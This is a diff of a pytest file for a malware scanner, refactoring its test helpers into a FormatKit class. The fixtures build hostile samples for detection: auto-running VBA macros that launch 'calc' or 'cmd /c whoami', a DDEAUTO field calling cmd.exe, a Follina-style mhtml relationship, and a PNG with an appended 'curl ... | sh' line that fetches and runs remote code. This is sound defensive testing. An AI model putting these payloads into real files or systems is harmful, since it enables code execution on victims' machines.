@@ -21,17 +21,7 @@ import pytest
 from cordon_scanner import Scanner
 from cordon_scanner.core.config import Config
 from cordon_scanner.formats import FormatError, documents, media, ole, pickles
-from formatkit import (
-    Reduces,
-    compound,
-    gif,
-    jpeg,
-    ooxml,
-    ovba_literal,
-    png,
-    relationship,
-    vba_project,
-)
+from formatkit import FormatKit, Reduces
 
 
 def _scan(tmp_path: Path, files: dict[str, bytes]):
@@ -165,31 +155,33 @@ class TestVbaDecompression:
     def test_the_output_budget_holds(self, monkeypatch) -> None:
         monkeypatch.setattr(ole, "MAX_SOURCE_BYTES", 100)
         with pytest.raises(FormatError):
-            ole.VbaSource.decompress(ovba_literal(b"A" * 400))
+            ole.VbaSource.decompress(FormatKit.ovba_literal(b"A" * 400))
 
 
 class TestCompoundFiles:
     def test_modules_are_found_and_decompressed(self) -> None:
         source = 'Sub AutoOpen()\r\n  Shell "calc"\r\nEnd Sub\r\n'
-        [module] = ole.VbaSource.vba_modules(ole.CompoundFile(vba_project(source)))
+        [module] = ole.VbaSource.vba_modules(ole.CompoundFile(FormatKit.vba_project(source)))
         assert module.name == "Module1"
         assert "Shell" in module.source
 
     def test_an_unreadable_dir_falls_back_to_the_attribute_search(self) -> None:
         cache = b"\xcc" * 40
-        code = ovba_literal(b'Attribute VB_Name = "M"\r\nSub Document_Open()\r\nEnd Sub\r\n')
-        raw = compound({"VBA/dir": b"\x00\x01\x02", "VBA/M": cache + code})
+        code = FormatKit.ovba_literal(
+            b'Attribute VB_Name = "M"\r\nSub Document_Open()\r\nEnd Sub\r\n'
+        )
+        raw = FormatKit.compound({"VBA/dir": b"\x00\x01\x02", "VBA/M": cache + code})
         [module] = ole.VbaSource.vba_modules(ole.CompoundFile(raw))
         assert "Document_Open" in module.source
 
     def test_a_sector_loop_is_refused(self) -> None:
-        raw = bytearray(vba_project("Sub X()\r\nEnd Sub\r\n"))
+        raw = bytearray(FormatKit.vba_project("Sub X()\r\nEnd Sub\r\n"))
         struct.pack_into("<I", raw, 512 + 4 * 3, 3)  # the module's sector points at itself
         with pytest.raises(FormatError):
             ole.VbaSource.vba_modules(ole.CompoundFile(bytes(raw)))
 
     def test_a_small_stream_is_read_from_the_ministream(self) -> None:
-        raw = bytearray(compound({"Data": b"x" * 64}))
+        raw = bytearray(FormatKit.compound({"Data": b"x" * 64}))
         # Rewrite it as a mini stream: cutoff 4096, root owns a one-sector mini stream at
         # sector 2 whose first 64-byte mini sector is the data, mini FAT at sector 3.
         struct.pack_into("<I", raw, 0x38, 4096)
@@ -212,9 +204,9 @@ class TestCompoundFiles:
 
 class TestOfficeDocuments:
     def test_an_auto_open_macro_that_runs_a_program(self) -> None:
-        raw = ooxml(
+        raw = FormatKit.ooxml(
             {
-                "word/vbaProject.bin": vba_project(
+                "word/vbaProject.bin": FormatKit.vba_project(
                     'Sub AutoOpen()\r\n  Shell "cmd /c whoami"\r\nEnd Sub\r\n'
                 )
             }
@@ -223,23 +215,27 @@ class TestOfficeDocuments:
         assert {"macro", "auto_exec"} <= kinds
 
     def test_a_macro_that_runs_nothing_by_itself_is_only_a_macro(self) -> None:
-        raw = ooxml(
-            {"xl/vbaProject.bin": vba_project('Sub Tidy()\r\n  Shell "calc"\r\nEnd Sub\r\n')}
+        raw = FormatKit.ooxml(
+            {
+                "xl/vbaProject.bin": FormatKit.vba_project(
+                    'Sub Tidy()\r\n  Shell "calc"\r\nEnd Sub\r\n'
+                )
+            }
         )
         kinds = {s.kind for s in documents.DocumentReader.read(raw, "book.xlsm").signals}
         assert kinds == {"macro"}
 
     def test_an_ole_document_with_macros(self) -> None:
-        raw = vba_project(
+        raw = FormatKit.vba_project(
             'Sub Workbook_Open()\r\n  CreateObject("WScript.Shell")\r\nEnd Sub\r\n', prefix=""
         )
         kinds = {s.kind for s in documents.DocumentReader.read(raw, "legacy.xls").signals}
         assert "auto_exec" in kinds
 
     def test_a_remote_template(self) -> None:
-        raw = ooxml(
+        raw = FormatKit.ooxml(
             {
-                "word/_rels/settings.xml.rels": relationship(
+                "word/_rels/settings.xml.rels": FormatKit.relationship(
                     "attachedTemplate", "https://cdn.example.net/t.dotm"
                 )
             }
@@ -249,9 +245,9 @@ class TestOfficeDocuments:
         assert "https://cdn.example.net" in signal.detail
 
     def test_the_follina_object_form(self) -> None:
-        raw = ooxml(
+        raw = FormatKit.ooxml(
             {
-                "word/_rels/document.xml.rels": relationship(
+                "word/_rels/document.xml.rels": FormatKit.relationship(
                     "oleObject", "mhtml:https://cdn.example.net/x.html!x-usc:y"
                 )
             }
@@ -261,10 +257,12 @@ class TestOfficeDocuments:
         ]
 
     def test_hyperlinks_and_internal_relationships_are_ordinary(self) -> None:
-        raw = ooxml(
+        raw = FormatKit.ooxml(
             {
-                "word/_rels/document.xml.rels": relationship("hyperlink", "https://example.org/"),
-                "word/_rels/settings.xml.rels": relationship(
+                "word/_rels/document.xml.rels": FormatKit.relationship(
+                    "hyperlink", "https://example.org/"
+                ),
+                "word/_rels/settings.xml.rels": FormatKit.relationship(
                     "attachedTemplate", "Normal.dotm", external=False
                 ),
             }
@@ -273,11 +271,11 @@ class TestOfficeDocuments:
 
     def test_a_dde_field(self) -> None:
         body = '<w:document><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\x\\\\cmd.exe "/k calc"</w:instrText></w:r></w:document>'
-        raw = ooxml({"word/document.xml": body})
+        raw = FormatKit.ooxml({"word/document.xml": body})
         assert [s.kind for s in documents.DocumentReader.read(raw, "memo.docx").signals] == ["dde"]
 
     def test_an_excel_4_macro_sheet(self) -> None:
-        raw = ooxml({"xl/macrosheets/sheet1.xml": "<xm:macrosheet/>"})
+        raw = FormatKit.ooxml({"xl/macrosheets/sheet1.xml": "<xm:macrosheet/>"})
         assert [s.kind for s in documents.DocumentReader.read(raw, "book.xlsm").signals] == [
             "macro_sheet"
         ]
@@ -348,14 +346,14 @@ class TestRtf:
 class TestDocumentsInAScan:
     def test_findings_and_severities(self, tmp_path) -> None:
         files = {
-            "docs/report.docm": ooxml(
+            "docs/report.docm": FormatKit.ooxml(
                 {
-                    "word/vbaProject.bin": vba_project(
+                    "word/vbaProject.bin": FormatKit.vba_project(
                         'Sub AutoOpen()\r\n  Shell "calc"\r\nEnd Sub\r\n'
                     )
                 }
             ),
-            "docs/plain.docx": ooxml({"word/document.xml": "<w:document/>"}),
+            "docs/plain.docx": FormatKit.ooxml({"word/document.xml": "<w:document/>"}),
         }
         found = _rules(_scan(tmp_path, files))
         [hit] = found["SUSPECT.DOCUMENT.AUTO_EXEC.001"]
@@ -368,36 +366,42 @@ class TestDocumentsInAScan:
 
 
 class TestImageTrailers:
-    @pytest.mark.parametrize("build", [png, jpeg, gif], ids=["png", "jpeg", "gif"])
+    @pytest.mark.parametrize(
+        "build", [FormatKit.png, FormatKit.jpeg, FormatKit.gif], ids=["png", "jpeg", "gif"]
+    )
     def test_a_clean_image_has_no_trailer(self, build) -> None:
         assert media.ImageTrailers.trailer(build()) is None
 
     def test_a_jpeg_thumbnail_end_marker_is_not_the_end(self) -> None:
-        assert media.ImageTrailers.trailer(jpeg(thumbnail=True)) is None
+        assert media.ImageTrailers.trailer(FormatKit.jpeg(thumbnail=True)) is None
 
-    @pytest.mark.parametrize("build", [png, jpeg, gif], ids=["png", "jpeg", "gif"])
+    @pytest.mark.parametrize(
+        "build", [FormatKit.png, FormatKit.jpeg, FormatKit.gif], ids=["png", "jpeg", "gif"]
+    )
     def test_an_appended_archive_is_named(self, build) -> None:
         found = media.ImageTrailers.trailer(build(b"PK\x03\x04" + b"\x00" * 64))
         assert found is not None and found.looks_like == "a zip archive"
 
     def test_an_appended_script(self) -> None:
         found = media.ImageTrailers.trailer(
-            png(b"#!/bin/sh\ncurl -sSL https://updates.invalid/x | sh\n")
+            FormatKit.png(b"#!/bin/sh\ncurl -sSL https://updates.invalid/x | sh\n")
         )
         assert found is not None and found.looks_like == "a script"
 
     def test_padding_is_not_a_trailer(self) -> None:
-        assert media.ImageTrailers.trailer(png(b"\x00" * 4096)) is None
-        assert media.ImageTrailers.trailer(jpeg(b"\n" * 8)) is None
+        assert media.ImageTrailers.trailer(FormatKit.png(b"\x00" * 4096)) is None
+        assert media.ImageTrailers.trailer(FormatKit.jpeg(b"\n" * 8)) is None
 
     def test_unrecognised_trailing_data_is_reported_low(self, tmp_path) -> None:
-        found = _rules(_scan(tmp_path, {"photo.png": png(os.urandom(0) + bytes(range(1, 200)))}))
+        found = _rules(
+            _scan(tmp_path, {"photo.png": FormatKit.png(os.urandom(0) + bytes(range(1, 200)))})
+        )
         [hit] = found["SUSPECT.MEDIA.TRAILING_DATA.001"]
         assert hit.severity.name == "LOW"
 
     def test_a_png_without_iend_is_unreadable(self) -> None:
         with pytest.raises(FormatError):
-            media.ImageTrailers.trailer(png()[:-12])
+            media.ImageTrailers.trailer(FormatKit.png()[:-12])
 
 
 class TestRiskyPdfLinks:
@@ -444,13 +448,13 @@ class TestZipAndOpaqueTrailers:
         import random
 
         noise = random.Random(7).randbytes(8192)  # noqa: S311 - test data, not a secret
-        found = media.ImageTrailers.trailer(png(noise))
+        found = media.ImageTrailers.trailer(FormatKit.png(noise))
         assert found is not None and found.opaque
-        result = Scanner(Config()).scan(_write(tmp_path, "banner.png", png(noise)))
+        result = Scanner(Config()).scan(_write(tmp_path, "banner.png", FormatKit.png(noise)))
         assert "SUSPECT.MEDIA.OPAQUE_TRAILER.001" in {f.rule_id for f in result.findings}
 
     def test_metadata_after_the_end_is_not_opaque(self) -> None:
-        found = media.ImageTrailers.trailer(png(b"Software: an editor\n" * 300))
+        found = media.ImageTrailers.trailer(FormatKit.png(b"Software: an editor\n" * 300))
         assert found is not None and not found.opaque
 
 
